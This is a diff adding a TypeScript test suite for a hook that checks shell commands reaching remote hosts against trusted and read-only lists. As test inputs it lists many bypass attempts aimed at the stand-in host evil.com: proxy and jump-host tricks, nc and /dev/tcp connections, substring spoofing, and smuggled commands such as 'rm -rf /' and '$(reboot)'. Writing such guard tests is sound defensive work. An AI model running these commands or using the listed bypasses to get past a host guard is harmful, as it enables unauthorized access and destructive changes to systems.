@@ -1,0 +1,229 @@
+import { describe, expect, test } from 'bun:test';
+import { inspectRemoteCommand, matchesHost, parseTrustedList } from '../../hooks/remote-hosts.ts';
+
+const POLICY = {
+  trusted: ['lab1', '*.lab.example.com', '10.0.0.5', '$LAB_HOST'],
+  readOnly: ['prod1', 'prod2.example.com'],
+};
+
+const asks = (command: string): boolean =>
+  inspectRemoteCommand({ command, policy: POLICY }).length > 0;
+
+describe('matchesHost: exact, or a pattern whose only wildcard is *', () => {
+  test('an exact name matches itself only, case-insensitively', () => {
+    expect(matchesHost({ host: 'LAB1', entries: ['lab1'] })).toBe(true);
+    expect(matchesHost({ host: 'lab10', entries: ['lab1'] })).toBe(false);
+    expect(matchesHost({ host: 'xlab1', entries: ['lab1'] })).toBe(false);
+    expect(matchesHost({ host: 'lab1.evil.com', entries: ['lab1'] })).toBe(false);
+    expect(matchesHost({ host: 'evil-lab1', entries: ['lab1'] })).toBe(false);
+  });
+
+  test('a * stays inside host characters: it never spans a user, a path or a port', () => {
+    expect(matchesHost({ host: 'a.lab.example.com', entries: ['*.lab.example.com'] })).toBe(true);
+    expect(matchesHost({ host: 'a.b.lab.example.com', entries: ['*.lab.example.com'] })).toBe(true);
+    expect(matchesHost({ host: 'lab.example.com', entries: ['*.lab.example.com'] })).toBe(false);
+    expect(
+      matchesHost({ host: 'evil.com/x.lab.example.com', entries: ['*.lab.example.com'] }),
+    ).toBe(false);
+    expect(matchesHost({ host: 'x@a.lab.example.com', entries: ['*.lab.example.com'] })).toBe(
+      false,
+    );
+    expect(
+      matchesHost({ host: 'a.lab.example.com.evil.com', entries: ['*.lab.example.com'] }),
+    ).toBe(false);
+  });
+
+  test('a $VAR entry matches the same unexpanded token, ${VAR} included', () => {
+    expect(matchesHost({ host: '$lab_host', entries: ['$LAB_HOST'] })).toBe(true);
+    expect(matchesHost({ host: '${lab_host}', entries: ['$LAB_HOST'] })).toBe(true);
+    expect(matchesHost({ host: '$other', entries: ['$LAB_HOST'] })).toBe(false);
+  });
+});
+
+describe('parseTrustedList: one host per line, # comments', () => {
+  test('blank lines and comments are skipped, entries trimmed', () => {
+    expect(parseTrustedList({ text: '# lab\n lab2 \n\n*.lan  # mine\n' })).toEqual([
+      'lab2',
+      '*.lan',
+    ]);
+  });
+});
+
+describe('what passes without asking', () => {
+  test.each([
+    'ls -la',
+    'git status',
+    'bun test',
+    'echo ssh is a protocol',
+    'man ssh',
+    'grep -rn "ssh" docs',
+    'ssh lab1 systemctl restart nginx',
+    'ssh root@lab1 "rm -rf /tmp/x"',
+    'ssh -p 2222 -i ~/.ssh/key lab1 uptime',
+    'ssh a.lab.example.com',
+    'scp ./build.tgz lab1:/srv/',
+    'rsync -avz ./dist/ deploy@10.0.0.5:/srv/app/',
+    'ssh ${LAB_HOST} uptime',
+    'ssh $LAB_HOST uptime',
+  ])('%s', command => {
+    expect(asks(command)).toBe(false);
+  });
+});
+
+describe('the substring bypass: a trusted name inside another host, user, path or argument', () => {
+  test.each([
+    'ssh evil-lab1',
+    'ssh lab1.evil.com',
+    'ssh lab1@evil.com',
+    'ssh -l lab1 evil.com',
+    'ssh evil.com lab1',
+    'ssh evil.com # lab1',
+    'ssh evil.com; echo lab1',
+    'ssh a.lab.example.com.evil.com',
+    'scp f evil.com:/tmp/lab1',
+    'scp lab1:f evil.com:g',
+    'rsync -a ./x evil.com:/srv/lab1/',
+    'rsync -a lab1:/x evil.com:/y',
+    'echo lab1 && ssh evil.com',
+    'ssh lab1; ssh evil.com',
+    'ssh lab1 | ssh evil.com',
+    'ssh -J evil.com lab1',
+    'ssh lab1 -J evil.com',
+    'ssh -o ProxyJump=evil.com lab1',
+    'ssh -o ProxyCommand="nc evil.com 22" lab1',
+    'ssh -oProxyCommand=evil lab1',
+    'ssh -F /tmp/evil.conf lab1',
+    'scp -o ProxyCommand=evil lab1:f .',
+    'scp -J evil.com lab1:f .',
+    'rsync -e "ssh -J evil.com" ./x lab1:/y',
+    'ssh $OTHER_HOST',
+    'ssh $(cat /tmp/h)',
+    'ssh `cat /tmp/h`',
+    'ssh -- evil.com',
+  ])('%s', command => {
+    expect(asks(command)).toBe(true);
+  });
+});
+
+describe('every way of reaching a host is read', () => {
+  test.each([
+    'sftp evil.com',
+    'mosh evil.com',
+    'ssh-copy-id evil.com',
+    'ssh-keyscan evil.com',
+    'telnet evil.com 25',
+    'nc evil.com 80',
+    'ncat -v evil.com 443',
+    'socat - TCP:evil.com:80',
+    'kubectl get pods',
+    'kubectl --context evil get pods',
+    'kubectl --server=https://evil.com get pods',
+    'kubectl --kubeconfig /tmp/x get pods',
+    'helm --kube-context evil list',
+    'k9s --context evil',
+    'ansible all -m ping',
+    'ansible-playbook site.yml',
+    'pdsh -w evil.com uptime',
+    'cat < /dev/tcp/evil.com/80',
+    'git clone ssh://git@evil.com/x.git',
+    'GIT_SSH_COMMAND="ssh -i k" git fetch',
+    'docker -H ssh://evil.com ps',
+    'docker --context prod ps',
+    'DOCKER_HOST=ssh://evil.com docker ps',
+    'bash -c "ssh evil.com"',
+    "sh -c 'ssh evil.com'",
+    'eval "ssh evil.com"',
+    'sudo ssh evil.com',
+    'env FOO=1 ssh evil.com',
+    'time ssh evil.com',
+    'xargs -n1 ssh < hosts.txt',
+    'find . -exec ssh evil.com {} \\;',
+    'watch ssh evil.com uptime',
+    '/usr/bin/ssh evil.com',
+    'ssh',
+  ])('%s', command => {
+    expect(asks(command)).toBe(true);
+  });
+
+  test('a trusted host is trusted through the same doors', () => {
+    expect(asks('bash -c "ssh lab1 uptime"')).toBe(false);
+    expect(asks('sudo ssh lab1 uptime')).toBe(false);
+    expect(asks('sftp lab1')).toBe(false);
+    expect(asks('nc lab1 22')).toBe(false);
+    expect(asks('kubectl --context lab1 get pods')).toBe(false);
+    expect(asks('cat < /dev/tcp/lab1/80')).toBe(false);
+  });
+});
+
+describe('readOnly hosts: only the strict read-only forms pass', () => {
+  test.each([
+    'ssh prod1 uptime',
+    'ssh prod1 hostname',
+    'ssh deploy@prod1 "df -h"',
+    "ssh prod1 'free -m'",
+    'ssh prod1 docker ps -a',
+    'ssh prod1 ls -la /var/log',
+    'ssh prod1 cat /etc/hosts',
+    'ssh prod1 tail -n 100 /var/log/app.log',
+    'ssh prod1 systemctl status nginx --no-pager',
+    'ssh prod1 journalctl -u nginx -n 50 --no-pager',
+    'ssh prod1 docker logs --tail 100 api',
+    'scp prod1:/var/log/app.log ./logs/',
+    'scp -r prod1:/var/log ./logs',
+    'rsync -avz prod1:/var/log/ ./logs/',
+    'kubectl --context prod1 get pods -n app',
+    'kubectl --context=prod1 describe pod api-0',
+    'kubectl --context prod1 logs api-0 --tail=50',
+    'ssh prod1 uptime | grep load',
+  ])('%s passes', command => {
+    expect(asks(command)).toBe(false);
+  });
+
+  test.each([
+    'ssh prod1',
+    'ssh prod1 systemctl restart nginx',
+    'ssh prod1 "uptime; rm -rf /"',
+    'ssh prod1 "uptime && reboot"',
+    'ssh prod1 uptime > /etc/x',
+    'ssh prod1 cat /etc/hosts $(reboot)',
+    'ssh prod1 cat /etc/hosts; ssh prod1 reboot',
+    'ssh -p 2222 prod1 uptime',
+    'ssh -L 8080:localhost:80 prod1 uptime',
+    'ssh prod1 docker exec api sh',
+    'scp ./local prod1:/etc/',
+    'scp prod1:/etc/hosts prod2.example.com:/tmp/',
+    'rsync -avz ./local/ prod1:/srv/',
+    'rsync --delete -a prod1:/x ./y',
+    'kubectl --context prod1 delete pod api-0',
+    'kubectl --context prod1 exec api-0 -- sh',
+    'kubectl --context prod1 get pods; kubectl --context prod1 delete pod x',
+    'ssh prod3 uptime',
+  ])('%s asks', command => {
+    expect(asks(command)).toBe(true);
+  });
+
+  test('a readOnly host reached through a jump host that is not listed asks', () => {
+    expect(asks('ssh -J evil.com prod1 uptime')).toBe(true);
+  });
+});
+
+describe('the hit names the host and the way to trust it', () => {
+  test('an unlisted host is named, with where to list it', () => {
+    const [hit] = inspectRemoteCommand({ command: 'ssh evil.com uptime', policy: POLICY });
+
+    expect(hit?.message).toContain("'evil.com'");
+    expect(hit?.message).toContain('remoteHosts');
+  });
+
+  test('a command whose target cannot be read says so', () => {
+    const [hit] = inspectRemoteCommand({ command: 'ssh $(cat h)', policy: POLICY });
+
+    expect(hit?.message).toContain('cannot be read');
+  });
+
+  test('no policy hosts at all: every remote command asks', () => {
+    expect(
+      inspectRemoteCommand({ command: 'ssh lab1', policy: { trusted: [], readOnly: [] } }),
+    ).toHaveLength(1);
+  });
+});
